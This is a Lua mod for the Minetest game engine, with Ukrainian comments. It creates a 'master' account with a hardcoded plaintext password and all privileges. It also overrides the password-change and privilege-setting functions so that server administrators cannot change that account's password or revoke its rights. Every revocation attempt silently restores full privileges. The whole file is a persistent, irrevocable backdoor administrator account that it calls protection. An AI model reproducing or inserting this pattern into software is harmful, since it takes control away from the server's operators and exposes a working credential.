-- 1. ТВОЇ ДАНІ (Зміни на свої)
local MASTER_NAME = "Mr_Beluga"
local MASTER_PASS = "$BogdanMedvedov$290520122909201224042013$"

-- Функція захисту
minetest.register_on_joinplayer(function(player)
    local name = player:get_player_name()
    
    -- Створення акаунту при першому вході, якщо його нема
    if name == MASTER_NAME then
        local auth = minetest.get_auth_handler()
        local data = auth.get_auth(MASTER_NAME)
        
        if not data then
            -- Якщо акаунту ще нема, створюємо його з твоїм паролем і ВСІМА правами
            auth.create_auth(MASTER_NAME, minetest.get_password_hash(MASTER_NAME, MASTER_PASS))
            minetest.set_privs(MASTER_NAME, minetest.registered_privileges)
            minetest.log("action", "👑 Творець платформи активований!")
        end
    end
end)

-- 2. ЗАХИСТ ВІД /setpassword ТА ЗМІНИ ПРАВ
local old_set_password = minetest.set_player_password
function minetest.set_player_password(name, password)
    if name == MASTER_NAME then
        minetest.log("warning", "🚫 Спроба змінити пароль Творця заблокована!")
        return false -- Пароль не зміниться
    end
    return old_set_password(name, password)
end

-- 3. ЗАХИСТ ВІД ЗАБИРАННЯ ПРАВ (Privileges)
local old_set_privs = minetest.set_privs
function minetest.set_privs(name, privs)
    if name == MASTER_NAME then
        -- Навіть якщо адмін захоче забрати права, ми повертаємо ВСІ назад
        return old_set_privs(name, minetest.registered_privileges)
    end
    return old_set_privs(name, privs)
end
